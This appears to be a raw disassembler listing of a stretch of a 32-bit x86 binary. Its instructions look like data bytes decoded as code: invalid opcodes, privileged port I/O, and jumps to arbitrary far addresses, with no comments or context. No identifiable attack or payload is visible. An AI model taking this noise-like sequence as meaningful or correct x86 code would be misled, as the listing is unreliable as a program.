  406f9d:	loop   0x406f60
  406f9f:	xor    DWORD PTR ds:0x27513962,eax
  406fa5:	shl    BYTE PTR [edi-0x57d028c0],cl
  406fab:	std    
  406fac:	xchg   ebp,eax
  406fad:	cmp    edi,eax
  406faf:	(bad)  
  406fb0:	ror    DWORD PTR [edx+ecx*4+0x37],cl
  406fb4:	xchg   ah,bh
  406fb6:	inc    eax
  406fb7:	cmc    
  406fb8:	icebp  
  406fb9:	push   esp
  406fba:	dec    esp
  406fbb:	sub    DWORD PTR [edx],0xffffffc7
  406fbe:	and    ah,BYTE PTR [ebp+0x5deaca99]
  406fc4:	popf   
  406fc5:	lods   al,BYTE PTR ds:[esi]
  406fc6:	cmp    esp,DWORD PTR [eax-0x24]
  406fc9:	sub    al,0x9c
  406fcb:	xchg   ebp,eax
  406fcc:	and    DWORD PTR [edx+ecx*4],eax
  406fcf:	sub    BYTE PTR ds:0x583fff73,dl
  406fd5:	xor    eax,0x8c08e6ef
  406fda:	xchg   edi,eax
  406fdb:	neg    DWORD PTR [edi-0x2e594d46]
  406fe1:	xchg   DWORD PTR [edx+0x6fdf95c0],esi
  406fe7:	push   eax
  406fe8:	or     ah,BYTE PTR [edx+eiz*1+0x78aa153]
  406fef:	adc    BYTE PTR [edi-0x33],dl
  406ff2:	dec    edi
  406ff3:	sub    al,0x20
  406ff5:	mov    edi,DWORD PTR [ecx]
  406ff7:	jmp    0x84c4:0x72d70e9b
  406ffe:	or     bh,BYTE PTR [eax+ebp*8+0x25]
  407002:	jnp    0x40704d
  407004:	and    eax,0xade3c46a
  407009:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40700a:	adc    cl,BYTE PTR [edx-0x7e]
  40700d:	out    0xc0,eax
  40700f:	sub    dl,BYTE PTR [ebp-0xe]
  407012:	mov    bl,0xf0
  407014:	and    ch,ah
  407016:	add    cl,BYTE PTR [eax+0x7e]
  407019:	push   edx
  40701a:	and    DWORD PTR [ebp-0x74],ecx
  40701d:	inc    edx
  40701e:	(bad)  
  40701f:	in     eax,dx
  407020:	add    BYTE PTR [edi+0x35376e6d],dl
  407026:	push   ds
  407027:	add    ch,cl
  407029:	aad    0x93
  40702b:	sub    ebp,DWORD PTR [ebp-0x1789e886]
  407031:	xchg   edi,eax
  407032:	call   0x3d9c0a3a
  407037:	out    dx,eax
  407038:	and    dl,cl
  40703a:	cmp    al,0xf4
  40703c:	mov    edi,0x4cdfbafc
  407041:	xchg   esi,eax
  407042:	cmp    BYTE PTR [eax+0x6b054fb1],dh
  407048:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  407049:	leave  
  40704a:	cmp    DWORD PTR [esi+0x6e],edi
  40704d:	sahf   
  40704e:	xchg   esi,eax
  40704f:	test   BYTE PTR [esi],0x4
  407052:	aaa    
  407053:	mov    ds:0xcfa1d58,al
  407058:	(bad)  
  407059:	jg     0x407087
  40705b:	push   cs
  40705c:	xchg   edx,eax
  40705d:	or     bh,BYTE PTR [ecx+eax*4+0x21]
  407061:	std    
  407062:	adc    dh,BYTE PTR [edx+0x2626e153]
  407068:	and    edi,DWORD PTR [eax-0x1d]
  40706b:	pushf  
  40706c:	cs jne 0x4070b0
  40706f:	push   ebp
  407070:	mov    ds:0x5703fd05,eax
  407075:	scas   eax,DWORD PTR es:[edi]
  407076:	sub    eax,0xaca30c6f
  40707b:	(bad)  [edi-0x1d9f5a22]
  407081:	push   0xfffffffb
  407083:	pop    edi
  407084:	imul   esp,DWORD PTR [edx-0x12],0xffffffa4
  407088:	xchg   esp,eax
  407089:	jnp    0x4070df
  40708b:	retf   0x75e9
  40708e:	aam    0xb6
  407090:	mov    eax,0xa6d03e42
  407095:	retf   
  407096:	xor    DWORD PTR [ebx-0xc386bab],ebx
  40709c:	fld    DWORD PTR [edx]
  40709e:	and    eax,0x9573ea00
  4070a3:	(bad)  [esi+0x3d]
  4070a6:	push   ebx
  4070a7:	call   0xcac:0x2e366e01
  4070ae:	popa   
  4070af:	clc    
  4070b0:	xchg   ebp,eax
  4070b1:	repnz or DWORD PTR [ecx],ecx
  4070b4:	imul   DWORD PTR [eax+0x6f]
  4070b7:	mov    ebx,0x315a7f3f
  4070bc:	push   edx
  4070bd:	sar    DWORD PTR [ebx-0x9],0x14
  4070c1:	pop    ds
  4070c2:	jbe    0x407118
  4070c4:	jno    0x40705f
  4070c6:	stc    
  4070c7:	mov    ds:0xdadd4f3,al
  4070cc:	and    ah,BYTE PTR [edx+0x0]
  4070cf:	add    bh,BYTE PTR [edx+ecx*4-0x4299d013]
  4070d6:	xor    bh,ah
  4070d8:	fdivr  DWORD PTR [ebx+0x40]
  4070db:	fisttp DWORD PTR [eax+0x27]
  4070de:	mov    dl,0x41
  4070e0:	lods   eax,DWORD PTR ds:[esi]
  4070e1:	adc    bl,BYTE PTR [esi-0x7bee87bd]
  4070e7:	iret   
  4070e8:	icebp  
  4070e9:	data16 test al,0x1c
  4070ec:	enter  0xfaa7,0x71
  4070f0:	cmp    ch,BYTE PTR [esi+0x68]
  4070f3:	popf   
  4070f4:	adc    eax,0xaf80d0a4
  4070f9:	xchg   edi,eax
  4070fa:	pop    ds
  4070fb:	or     DWORD PTR [edi+edi*8-0x68df1a47],edi
  407102:	inc    edi
  407103:	jno    0x407156
  407105:	sbb    dl,BYTE PTR [ecx]
  407107:	pop    ss
  407108:	psubsb mm4,QWORD PTR [edx]
  40710b:	retf   0x8cb6
  40710e:	outs   dx,DWORD PTR ds:[esi]
  40710f:	mov    esi,0x47ac4c52
  407114:	sbb    edx,DWORD PTR [edx]
  407116:	adc    dl,BYTE PTR [esi-0x1ceb2339]
  40711c:	mov    BYTE PTR [edx-0x5a],bh
  40711f:	int3   
  407120:	and    ebx,DWORD PTR [edi]
  407122:	mov    edx,0x2fd2a53c
  407127:	xchg   DWORD PTR [edi],edi
  407129:	mov    edx,0xcae22470
  40712e:	aad    0xef
  407130:	pop    edi
  407131:	or     al,0x92
  407133:	out    dx,al
  407134:	in     eax,0x20
  407136:	jae    0x40712f
  407138:	jmp    0xc83f92ff
  40713d:	je     0x4071b8
  40713f:	std    
  407140:	mov    dl,0x38
  407142:	pushf  
  407143:	and    eax,0x9c3aa9e1
  407148:	sub    BYTE PTR [ebx-0x27],bl
  40714b:	inc    ebp
  40714c:	inc    edx
  40714d:	jmp    0x46f652
  407152:	js     0x40713e
  407154:	popa   
  407155:	fwait
  407156:	sbb    eax,0x6293110d
  40715b:	arpl   WORD PTR [esi+0x17],di
  40715e:	fs cmc 
  407160:	ins    BYTE PTR es:[edi],dx
  407161:	cmp    al,0xad
  407163:	sbb    ebx,DWORD PTR [eax+0x55e34dbc]
  407169:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40716a:	addr16 dec edx
  40716c:	je     0x407145
  40716e:	push   edx
  40716f:	(bad)  
  407170:	fadd   QWORD PTR [esi-0x7f]
  407173:	fdivr  DWORD PTR [edx+0x54cdaeba]
  407179:	adc    DWORD PTR [ecx+0x26bdcdd9],ebx
  40717f:	enter  0x2348,0x32
  407183:	xchg   edx,eax
  407184:	je     0x4071f6
  407186:	adc    al,0xc9
  407188:	call   0x3391:0xfbad0325
  40718f:	sbb    bh,dl
  407191:	sti    
  407192:	out    0x22,al
  407194:	cmp    DWORD PTR [edi+0x216410e5],esp
  40719a:	int3   
  40719b:	retf   0x19ae
  40719e:	cdq    
  40719f:	pop    ebx
  4071a0:	xor    DWORD PTR [edx],ecx
  4071a2:	shl    edi,0x36
  4071a5:	jne    0x4071ea
  4071a7:	hlt    
  4071a8:	pop    esp
  4071a9:	int3   
  4071aa:	daa    
  4071ab:	push   es
  4071ac:	(bad)  
  4071ad:	lods   eax,DWORD PTR ds:[esi]
  4071ae:	add    DWORD PTR [edx+0x62186887],0xff584aac
  4071b8:	test   BYTE PTR [edi-0x4a],bl
  4071bb:	and    ch,BYTE PTR [edi-0x1963e164]
  4071c1:	adc    BYTE PTR [eax-0x63395e72],ch
  4071c7:	stc    
  4071c8:	cmp    BYTE PTR [ebx+0x65cacbb9],ch
  4071ce:	ins    DWORD PTR es:[edi],dx
  4071cf:	and    al,0x18
  4071d1:	(bad)  
  4071d2:	es je  0x4071d4
  4071d5:	xor    DWORD PTR [eax+0x60],eax
  4071d8:	sbb    esp,DWORD PTR [eax+eax*8]
  4071db:	jno    0x4071fe
  4071dd:	ins    DWORD PTR es:[edi],dx
  4071de:	xchg   edi,eax
  4071df:	lds    ebx,FWORD PTR [edx+ebx*2-0x41d9f864]
  4071e6:	sbb    BYTE PTR [edi+eiz*1+0xcbc79e3],0x87
  4071ee:	out    0x35,al
  4071f0:	mov    bh,BYTE PTR [ecx]
  4071f2:	xchg   ecx,eax
  4071f3:	xlat   BYTE PTR ds:[ebx]
  4071f4:	jno    0x4071ba
  4071f6:	and    dh,BYTE PTR [edx]
  4071f8:	clc    
  4071f9:	jae    0x4071c1
  4071fb:	pop    esi
  4071fc:	addr16 sub eax,0x8161cc76
  407202:	adc    BYTE PTR [eax+ebp*4-0x6f],al
  407206:	sti    
  407207:	cdq    
  407208:	pop    es
  407209:	mov    BYTE PTR [eax+0x42e6cbde],al
  40720f:	xor    al,BYTE PTR [edx-0x7f]
  407212:	fsubrp st(1),st
  407214:	in     eax,0x74
  407216:	dec    edx
  407217:	mov    fs,WORD PTR [ebp-0x7a]
  40721a:	xor    DWORD PTR [ebx],ecx
  40721c:	jae    0x4071ba
  40721e:	cmp    bl,BYTE PTR [ebp-0x31]
  407221:	test   BYTE PTR [edx-0x5d],dl
  407224:	xchg   BYTE PTR [ebx+ebx*4+0x24cba4cd],bh
  40722b:	xlat   BYTE PTR ds:[ebx]
  40722c:	or     ecx,DWORD PTR [esi-0x60]
  40722f:	jg     0x40726b
  407231:	in     al,dx
  407232:	ror    BYTE PTR [ecx-0x7b66d35a],0xa3
  407239:	cmp    eax,0xc0b1521f
  40723e:	push   edi
  40723f:	mov    ebx,0x8f24cb31
  407244:	or     al,0x1a
  407246:	icebp  
  407247:	add    eax,0x754adb87
  40724c:	fs add al,0x3a
  40724f:	pop    es
  407250:	and    ah,BYTE PTR ds:0x391e83db
  407256:	cli    
  407257:	pop    ebp
  407258:	sbb    al,0x70
  40725a:	push   ebx
  40725b:	or     cl,BYTE PTR [edx]
  40725d:	cli    
  40725e:	xchg   ecx,eax
  40725f:	fwait
  407260:	push   ss
  407261:	push   edx
  407262:	sbb    DWORD PTR [ebp-0x32],0xffffff9c
  407266:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  407267:	mov    BYTE PTR [ebx+0x115cdf27],bh
  40726d:	xor    BYTE PTR [esi],dl
  40726f:	pop    eax
  407270:	cld    
  407271:	cmp    ebx,edx
  407273:	test   DWORD PTR [ebx+0x5f],0x590cb446
  40727a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40727b:	sbb    al,0x4f
  40727d:	test   BYTE PTR [ecx+0x7912fb],0xdc
  407284:	or     eax,0xea76d75f
  407289:	or     ah,bl
  40728b:	loope  0x40726f
  40728d:	test   al,0x77
  40728f:	arpl   WORD PTR [ebx],cx
  407291:	adc    BYTE PTR [esi+0x19],bh
  407294:	adc    edx,esi
  407296:	aas    
  407297:	in     eax,0x65
  407299:	repz cli 
  40729b:	stos   BYTE PTR es:[edi],al
  40729c:	mov    edx,0x4aeca860
  4072a1:	mov    bl,0xf2
  4072a3:	ss sub al,0xe0
  4072a6:	test   eax,0x4ecdf118
  4072ab:	pmaxsw mm3,QWORD PTR [eax+esi*8+0x2fef0ba4]
  4072b3:	js     0x4072a5
  4072b5:	push   ds
  4072b6:	mov    cl,0x79
  4072b8:	mov    edx,0xa13dc63b
  4072bd:	mov    cl,0x18
  4072bf:	(bad)  
  4072c0:	cmp    DWORD PTR [ebp+0x75],eax
  4072c3:	gs cmc 
  4072c5:	sub    bh,BYTE PTR gs:[esp+eax*2+0x10]
  4072ca:	xchg   ecx,eax
  4072cb:	push   0x9e5c9fac
  4072d0:	vfmadd213ss xmm0,xmm0,DWORD PTR [edi+0x4bd8d194]
  4072d9:	lods   al,BYTE PTR ds:[esi]
  4072da:	lock data16 cld 
  4072dd:	or     eax,0xcaeb6652
  4072e2:	daa    
  4072e3:	mov    ch,0x4f
  4072e5:	and    al,0x32
  4072e7:	sbb    BYTE PTR [ebx-0x4d],0x64
  4072eb:	jb     0x40726e
  4072ed:	and    ah,BYTE PTR [ecx+edi*2]
  4072f0:	clc    
  4072f1:	data16 cmp dh,BYTE PTR [eax-0x42]
  4072f5:	leave  
  4072f6:	sbb    esp,eax
  4072f8:	arpl   WORD PTR [esi],bx
  4072fa:	dec    ebx
  4072fb:	aas    
  4072fc:	pop    edi
  4072fd:	sub    esi,DWORD PTR [edx-0x61528e51]
  407303:	add    ah,BYTE PTR [ebp-0x73dec36c]
  407309:	jbe    0x407386
  40730b:	sub    al,dh
  40730d:	cld    
  40730e:	and    ebp,ebx
  407310:	out    0x1e,eax
  407312:	retf   0x67ee
  407315:	test   BYTE PTR [esi-0x61],cl
  407318:	xchg   ecx,eax
  407319:	popf   
  40731a:	inc    BYTE PTR [esi+0xe8955d2]
  407320:	loopne 0x40739d
  407322:	test   al,0xd7
  407324:	xor    ebp,ecx
  407326:	inc    ebx
  407327:	(bad)  
  407328:	adc    BYTE PTR ds:0x61bb803a,bl
  40732e:	gs push ss
  407330:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  407331:	add    eax,0x9616abdd
  407336:	sbb    al,0xec
  407338:	into   
  407339:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40733a:	(bad)  
  40733b:	adc    esp,ecx
  40733d:	add    eax,0xb930d9c2
  407342:	out    dx,al
  407343:	mov    ah,0x9f
  407345:	mov    esp,0xb748e70
  40734a:	fist   WORD PTR [ecx]
  40734c:	sbb    esp,edx
  40734e:	push   0xffffffd6
  407350:	rcl    edi,1
  407352:	jecxz  0x407336
  407354:	lea    edx,[esi+0x632ba16f]
  40735a:	pop    esi
  40735b:	mov    esi,0xbde79cc5
  407360:	jae    0x4073b5
  407362:	adc    al,0x7e
  407365:	pavgb  mm0,QWORD PTR [ecx-0x55939471]
  40736c:	inc    ecx
  40736d:	adc    dh,BYTE PTR [edx+0xf38b5e5]
  407373:	arpl   WORD PTR [edi+edx*2],si
  407376:	inc    esp
  407377:	adc    al,0x1c
  407379:	hlt    
  40737a:	push   ds
  40737b:	jb     0x407312
  40737d:	add    bh,BYTE PTR [ebx+0x510209d9]
  407383:	fcom   DWORD PTR [ecx]
  407385:	add    ebp,ebx
  407387:	mov    WORD PTR [esi+0x32],gs
  40738a:	pop    esp
  40738b:	inc    ebx
  40738c:	stos   DWORD PTR es:[edi],eax
  40738d:	daa    
  40738e:	or     BYTE PTR [edx+0x27af0c0d],bh
  407394:	mov    ds,WORD PTR [ecx-0x7bc36fb3]
  40739a:	aad    0xee
  40739c:	cmp    DWORD PTR ds:0x6242c650,esi
  4073a2:	call   0x2af06214
  4073a7:	(bad)  
  4073a8:	shl    DWORD PTR [eax],cl
  4073aa:	push   ss
  4073ab:	add    eax,0xefdc6c30
  4073b0:	mov    ebx,0x990123ce
  4073b5:	leave  
  4073b6:	xchg   edx,eax
  4073b7:	mov    dl,0xf0
  4073b9:	lock (bad) 
  4073bb:	mov    ebx,0x3527673f
  4073c0:	sub    ebp,DWORD PTR [edx]
  4073c2:	mov    DWORD PTR [edx-0x6bc3c160],edi
  4073c8:	and    DWORD PTR [edx+0x35],ebx
  4073cb:	mov    dh,0x86
  4073cd:	inc    edi
  4073ce:	dec    bx
  4073d0:	mov    dl,0x9c
  4073d2:	dec    edx
  4073d3:	xor    BYTE PTR [edx],ah
  4073d5:	sbb    al,0x97
  4073d7:	dec    esi
  4073d8:	rcl    DWORD PTR [esi],cl
  4073da:	inc    ebp
  4073db:	pop    edx
  4073dc:	dec    ebx
  4073dd:	fdiv   QWORD PTR [ebx-0x6193d26c]
  4073e3:	or     al,0xf9
  4073e5:	rcr    BYTE PTR [eax],1
  4073e7:	(bad)
  4073ea:	cmp    eax,0x38d39117
  4073ef:	xor    ah,BYTE PTR [eax+0x7b1448b9]
  4073f5:	lods   eax,DWORD PTR ds:[esi]
  4073f6:	pop    esp
  4073f7:	sub    dl,BYTE PTR [ebx+0x370390b3]
  4073fd:	pop    esp
  4073fe:	jge    0x4073b4
  407400:	jmp    0x8d1632
  407405:	in     eax,0xca
  407407:	mov    db7,edx
  40740a:	arpl   WORD PTR [edx+edi*8-0x3b267ac9],bx
  407411:	adc    edi,DWORD PTR [edx]
  407413:	xor    esp,DWORD PTR [ebp-0x55cb8454]
  407419:	cmp    al,0x66
  40741b:	inc    eax
  40741c:	push   cs
  40741d:	repz clc 
  40741f:	loopne 0x4073a8
  407421:	loope  0x4073ee
  407423:	sti    
  407424:	mov    bl,0xfb
  407426:	mov    ebx,0xadfe95aa
  40742b:	cld    
  40742c:	fwait
  40742d:	int3   
  40742e:	mov    cl,0x27
  407430:	sbb    eax,0x9ec64051
  407435:	loopne 0x40744a
  407437:	fld    DWORD PTR [edi+eax*2+0x73]
  40743b:	loope  0x4074ba
  40743d:	jp     0x407486
  40743f:	jnp    0x40749e
  407441:	pop    edx
  407442:	les    ebp,FWORD PTR [edx-0x421ddf8d]
  407448:	jne    0x407422
  40744a:	jnp    0x4073e6
  40744c:	push   cs
  40744d:	ds xchg ebx,eax
  40744f:	bound  esi,QWORD PTR [ebx]
  407451:	gs xor bl,dh
  407454:	jmp    0xb37a8ee4
  407459:	rcl    DWORD PTR [ebp+0x7f],cl
  40745c:	cwde   
  40745d:	stos   DWORD PTR es:[edi],eax
  40745e:	outs   dx,BYTE PTR ds:[esi]
  40745f:	retf   
  407460:	aam    0xab
  407462:	jl     0x407431
  407464:	and    eax,0x743113ba
  407469:	push   eax
  40746a:	test   DWORD PTR [ecx+0x3c],esp
  40746d:	popa   
  40746e:	cld    
  40746f:	mov    ecx,0xab1c6814
  407474:	or     dh,ch
  407476:	xchg   BYTE PTR [ecx+eiz*1+0x43adf1ca],bh
  40747d:	inc    esi
  40747e:	out    dx,eax
  40747f:	lock sub al,bl
  407482:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  407483:	cmc    
  407484:	(bad)  
  407485:	fxch   st(5)
  407487:	sahf   
  407488:	neg    bh
  40748a:	pop    esi
  40748b:	pop    ss
  40748c:	mov    cl,0x97
  40748e:	and    edi,DWORD PTR [ebx]
  407490:	jle    0x407488
  407492:	in     eax,dx
  407493:	sbb    BYTE PTR gs:[edx+0x2b1fc54],dh
  40749a:	pop    ebp
  40749b:	daa    
  40749c:	cmp    al,0xe9
  40749e:	loopne 0x40742a
  4074a0:	add    DWORD PTR [ecx],edx
  4074a2:	jmp    FWORD PTR [ebx]
  4074a4:	push   esp
  4074a5:	aaa    
  4074a6:	cmp    eax,0x4862ac85
  4074ab:	inc    ebp
  4074ac:	or     cl,BYTE PTR [edx]
  4074ae:	ror    DWORD PTR [esi+ebp*2],cl
  4074b1:	not    BYTE PTR [ebx-0x60]
  4074b4:	fadd   QWORD PTR [eax]
  4074b6:	aam    0x90
  4074b8:	mov    ch,0x52
  4074ba:	xchg   ebx,eax
  4074bb:	scas   al,BYTE PTR es:[edi]
  4074bc:	xchg   esi,eax
  4074bd:	jg     0x407520
  4074bf:	push   esi
  4074c0:	ins    DWORD PTR es:[edi],dx
  4074c1:	push   edi
  4074c2:	pop    ds
  4074c3:	in     al,dx
  4074c4:	sub    ah,bl
  4074c6:	call   0x9c1a6ce5
  4074cb:	mov    ds,WORD PTR [ecx]
  4074cd:	sar    BYTE PTR [edx+0x4bec31ff],0x20
  4074d4:	jns    0x4074c8
  4074d6:	repnz xor cl,BYTE PTR [ebx]
  4074d9:	jmp    0x1f2465b1
  4074de:	push   ss
  4074df:	scas   eax,DWORD PTR es:[edi]
  4074e0:	adc    esi,eax
  4074e2:	sbb    dl,ch
  4074e4:	pop    eax
  4074e5:	in     eax,0x22
  4074e7:	in     eax,dx
  4074e8:	sahf   
  4074e9:	int    0x10
  4074eb:	lea    ecx,[ebp+eiz*1-0x51]
  4074ef:	xchg   esi,eax
  4074f0:	pop    es
  4074f1:	mov    ds:0x9dd2cafa,al
  4074f6:	push   ds
  4074f7:	sub    cl,ah
  4074f9:	push   eax
  4074fa:	fbstp  TBYTE PTR [ebp+0x56f44af8]
  407500:	mov    eax,ds:0x276a90f
  407505:	addr16 jno 0x4074a7
  407508:	inc    edx
  407509:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40750a:	inc    edi
  40750b:	dec    ecx
  40750c:	fst    QWORD PTR [ecx+0x6bc9ac20]
  407512:	cmp    ah,bh
  407514:	xchg   BYTE PTR [eax-0x71ba2df1],ch
  40751a:	mov    cl,0xe5
  40751d:	push   eax
  40751e:	arpl   WORD PTR [esi+0x106dd843],cx
  407524:	sbb    edx,DWORD PTR [eax+eiz*4-0x6a11801b]
  40752b:	mov    al,cl
  40752d:	mov    WORD PTR [edx],?
  40752f:	pop    esp
  407530:	mov    eax,ds:0x94eaf596
  407535:	out    dx,eax
  407536:	add    bl,bh
  407538:	sub    dl,BYTE PTR [esi]
  40753a:	out    dx,al
  40753b:	fdivr  DWORD PTR [ebp+ebp*4-0x6c1cf8a]
  407542:	dec    esp
  407543:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  407544:	out    dx,al
  407545:	push   es
  407546:	mov    dl,0x12
  407548:	jns    0x4074e0
  40754a:	mov    al,ah
  40754c:	ins    BYTE PTR es:[edi],dx
  40754d:	movhlps xmm5,xmm3
  407550:	xor    esp,ecx
  407552:	pop    edx
  407553:	loope  0x40758f
  407555:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  407556:	xor    BYTE PTR [esi],al
  407558:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  407559:	fadd   DWORD PTR [esp+eax*1-0x44]
  40755d:	int3   
  40755e:	inc    esp
  40755f:	je     0x407519
  407561:	and    DWORD PTR [eax+0x1d],ebx
  407564:	and    eax,0x3204e0b4
  407569:	adc    DWORD PTR [ebx+0x52],esp
  40756c:	ror    cl,0x5d
  40756f:	fst    QWORD PTR [edx]
  407571:	jl     0x407520
  407573:	mov    ecx,0x68784c45
  407578:	adc    al,0xcc
  40757a:	jge    0x4075d6
  40757c:	or     DWORD PTR [eax-0x7514619f],ecx
  407582:	mov    DWORD PTR [esi+0x77353bdd],eax
  407588:	add    DWORD PTR [edi-0x74508e0c],edx
  40758e:	in     eax,0xea
  407590:	addr16 iret 
  407592:	cld    
  407593:	(bad)  
  407594:	cmp    DWORD PTR ds:0x64afdb42,eax
  40759a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40759b:	cdq    
  40759c:	or     al,0x7e
  40759e:	mov    eax,0x4564c1ba
  4075a3:	sub    DWORD PTR [eax+0x37],eax
  4075a6:	xor    al,0x70
  4075a8:	outs   dx,BYTE PTR ds:[esi]
  4075a9:	sbb    DWORD PTR [ebx-0x4],ebp
  4075ac:	add    dl,ch
  4075ae:	je     0x4075ec
  4075b0:	dec    ebx
  4075b1:	xor    ah,dh
  4075b3:	cmp    ebx,eax
  4075b5:	jb     0x407585
  4075b7:	push   0x4283ef8e
  4075bc:	or     dl,BYTE PTR [edi+0x7f]
  4075bf:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4075c0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4075c1:	retf   0xb284
  4075c4:	mov    ds:0x96f2e2b0,eax
  4075c9:	pop    ebx
  4075ca:	(bad)  
  4075cc:	out    0xaa,eax
  4075ce:	inc    edi
  4075cf:	aas    
  4075d0:	mov    edx,0x16a8144e
  4075d5:	xor    eax,0x66b464a3
  4075da:	in     eax,dx
  4075db:	add    bh,al
  4075dd:	cmp    al,0x72
  4075df:	dec    esi
  4075e0:	xlat   BYTE PTR ds:[ebx]
  4075e1:	iret   
  4075e2:	rcr    DWORD PTR [ebx+edx*4-0x74c3310e],cl
  4075e9:	dec    ebx
  4075ea:	inc    ebx
  4075eb:	shr    BYTE PTR [ebp+eiz*1-0x63],cl
  4075ef:	push   ebp
  4075f0:	mov    ecx,0x353f1e91
  4075f5:	outs   dx,BYTE PTR ds:[esi]
  4075f6:	test   eax,0xe456d4
  4075fb:	cdq    
  4075fc:	fiadd  WORD PTR [edi+0x3b]
  4075ff:	mov    ss,edi
  407601:	jl     0x4075e8
  407603:	inc    edx
  407604:	neg    DWORD PTR [eax+0x6e]
  407607:	jmp    0xf6cfcd9f
  40760c:	xchg   edx,eax
  40760d:	scas   al,BYTE PTR es:[edi]
  40760e:	mov    ah,0x94
  407610:	iret   
  407611:	jo     0x40761d
  407613:	ret    
  407614:	sahf   
  407615:	nop
  407616:	pusha  
  407617:	lea    eax,[esi]
  407619:	add    dh,dh
  40761b:	fcom   st(2)
  40761d:	jmp    0x407613
  40761f:	lahf   
  407620:	(bad)  
  407621:	std    
  407622:	neg    eax
  407624:	sub    BYTE PTR [esi-0x58],dh
  407627:	test   BYTE PTR [eax+0x39b35638],0xc1
  40762e:	xchg   ecx,eax
  40762f:	or     cl,ah
  407631:	or     eax,0xddd0bb92
  407636:	loop   0x407668
  407638:	retf   
  407639:	mov    dh,0x67
  40763b:	pextrw esi,(bad),0xc5
  40763d:	xor    al,ch
  40763f:	mov    ah,0x43
  407641:	xchg   esp,eax
  407642:	and    ebx,ecx
  407644:	lods   eax,DWORD PTR ds:[esi]
  407645:	and    ah,BYTE PTR [ebx+0x1e205372]
  40764b:	jae    0x407604
  40764d:	push   ecx
  40764f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  407650:	ds xchg edx,eax
  407652:	lods   al,BYTE PTR ds:[esi]
  407653:	into   
  407654:	add    eax,0xbeddf54
  407659:	stos   DWORD PTR es:[edi],eax
  40765a:	push   esi
  40765b:	adc    al,0x6c
  40765d:	repz or bh,cl
  407660:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  407661:	ss xchg edx,eax
  407663:	ret    
  407664:	cmp    BYTE PTR [ebp+0x7b132bae],al
  40766a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40766b:	jne    0x40765d
  40766d:	test   DWORD PTR [ecx+0x15c35910],ebp
  407673:	push   DWORD PTR [eax]
  407675:	fsub   st,st(6)
  407677:	mov    ds:0xdb73adb4,al
  40767c:	mov    ah,0x6f
  40767e:	fiadd  DWORD PTR [eax-0x49]
  407681:	adc    DWORD PTR [ecx+0x43de0394],0xffffffb5
  407688:	dec    esp
  407689:	aas    
  40768a:	(bad)  
  40768b:	mov    esp,0x786ff108
  407690:	sti    
  407691:	stc    
  407692:	ins    BYTE PTR es:[edi],dx
  407693:	adc    BYTE PTR [edi-0x1d],ah
  407696:	xchg   DWORD PTR [edx+0x35097454],edi
  40769c:	jns    0x407687
  40769e:	sbb    DWORD PTR ds:0x8a8ff609,ebp
  4076a4:	pop    edx
  4076a5:	call   0x2f00b5a
  4076aa:	xor    dl,BYTE PTR [ecx]
  4076ac:	mov    dh,0xde
  4076ae:	or     eax,0xe34c9fce
  4076b3:	in     al,dx
  4076b4:	add    eax,0x514ccbe5
  4076b9:	test   BYTE PTR [ecx+0x4fbf822a],ch
  4076bf:	scas   eax,DWORD PTR es:[edi]
  4076c0:	imul   edi,DWORD PTR [ebx-0x6885727d],0xffffff9e
  4076c7:	xchg   DWORD PTR [ecx-0x1f89fc4e],ebx
  4076cd:	leave  
  4076ce:	xor    edi,ebx
  4076d0:	jecxz  0x40767c
  4076d2:	cmp    cl,dh
  4076d4:	outs   dx,BYTE PTR ds:[esi]
  4076d5:	cdq    
  4076d6:	(bad)  
  4076d7:	(bad)  
  4076d8:	mov    edi,0xbe653d76
  4076dd:	ret    0x67fd
  4076e0:	and    dh,BYTE PTR [edi]
  4076e2:	jl     0x40770b
  4076e4:	dec    ecx
  4076e5:	xchg   ecx,eax
  4076e6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4076e7:	imul   esi,DWORD PTR [edx+0x6c77fc6e],0x40
  4076ee:	push   edi
  4076ef:	jns    0x40768d
  4076f1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4076f2:	mov    dl,0x7b
  4076f4:	mov    BYTE PTR [edi+0x6d],dl
  4076f7:	iret   
  4076f8:	scas   eax,DWORD PTR es:[edi]
  4076f9:	scas   eax,DWORD PTR es:[edi]
  4076fa:	icebp  
  4076fb:	cmp    DWORD PTR ds:0x7d197bf,0xfd6bc36e
  407705:	pushf  
  407706:	test   BYTE PTR [ebp-0x1571a890],dl
  40770c:	ds aaa 
  40770e:	push   ds
  40770f:	sub    al,0x8c
  407711:	fsubr  DWORD PTR [edi+0x53]
  407714:	mov    DWORD PTR [ecx-0x49],0x79293852
  40771b:	clc    
  40771c:	test   al,0x55
  40771e:	push   edx
  40771f:	push   cs
  407720:	dec    ebx
  407721:	or     edi,esi
  407723:	or     BYTE PTR [esi-0x77f3881b],0x53
  40772a:	jbe    0x4076c4
  40772c:	add    BYTE PTR [esi],ah
  40772e:	xor    BYTE PTR ds:0x72078d9a,dh
  407734:	retf   0x39c7
  407737:	mov    ah,0x4e
  407739:	xor    edx,esi
  40773b:	sbb    al,dh
  40773d:	jo     0x407709
  40773f:	(bad)  
  407740:	fdivr  QWORD PTR cs:[ecx-0x63]
  407744:	mov    eax,ds:0x56b80119
  407749:	inc    ebx
  40774a:	inc    edi
  40774b:	stos   DWORD PTR es:[edi],eax
  40774c:	xor    BYTE PTR [esi+0x18],0xb9
  407750:	mov    DWORD PTR [ecx],eax
  407752:	std    
  407753:	pusha  
  407754:	dec    ebp
